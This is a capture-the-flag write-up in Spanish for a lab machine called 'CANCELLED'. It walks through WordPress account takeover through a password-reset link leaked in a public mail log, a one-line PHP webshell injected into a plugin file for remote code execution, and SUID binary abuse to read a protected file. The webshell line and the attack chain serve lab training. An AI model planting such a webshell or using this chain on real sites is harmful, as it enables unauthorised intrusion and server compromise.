# Writeup: Máquina CANCELLED

La máquina se vulnera interceptando un enlace de recuperación de contraseña expuesto públicamente en los logs para acceder a WordPress, logrando ejecución remota de código (RCE) al inyectar una webshell en un plugin, y abusando de un binario SUID para leer la flag final[cite: 2].

## Reconocimiento y Enumeración
* El escaneo inicial de puertos reveló los puertos 22 (SSH) y 80 (HTTP) abiertos en la dirección objetivo 172.17.0.2[cite: 2].
* La enumeración del servicio web identificó una instalación de WordPress versión 7.1.1 y confirmó la existencia del usuario administrativo `admin`[cite: 2].
* El fuzzing de directorios determinó que múltiples rutas tenían habilitado el listado de directorios (Directory Listing), incluyendo `/wp-content/uploads/` y `/wp-content/plugins/`[cite: 2].
* Se identificaron archivos de configuración expuestos o mal configurados, evidenciando malas prácticas en el entorno de producción[cite: 2].

## Explotación
* Se solicitó un restablecimiento de contraseña para el usuario `admin` a través del portal de login de WordPress[cite: 2].
* Debido a la ausencia de un servicio de correo (MTA) real, el sistema guardó el correo electrónico saliente en un archivo de registro público ubicado en `/wp-content/uploads/mail.log`[cite: 2].
* Al inspeccionar este archivo, se obtuvo el enlace de restablecimiento válido, permitiendo cambiar la credencial y acceder al panel de administración del CMS[cite: 2].
* Se inyectó una webshell PHP (`<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>`) en el archivo `woocommerce.php` utilizando el editor de plugins de WordPress[cite: 2].
* La ejecución de este script otorgó Ejecución Remota de Código (RCE) bajo el contexto del usuario `www-data` (`uid=33`)[cite: 2].

## Post-Explotación
* Con acceso al sistema, se realizó una búsqueda de binarios con permisos SUID, localizando el ejecutable personalizado `/usr/local/bin/sysmonitor`[cite: 2].
* Se abusó de la sintaxis del binario (`/usr/local/bin/sysmonitor <archivo_logs>`) para forzar la lectura del archivo protegido del administrador[cite: 2].
* Se obtuvo exitosamente la flag final: `flag{CVE_2026_11387_SMS_ALERT_TAKEOVER_2026}`[cite: 2].
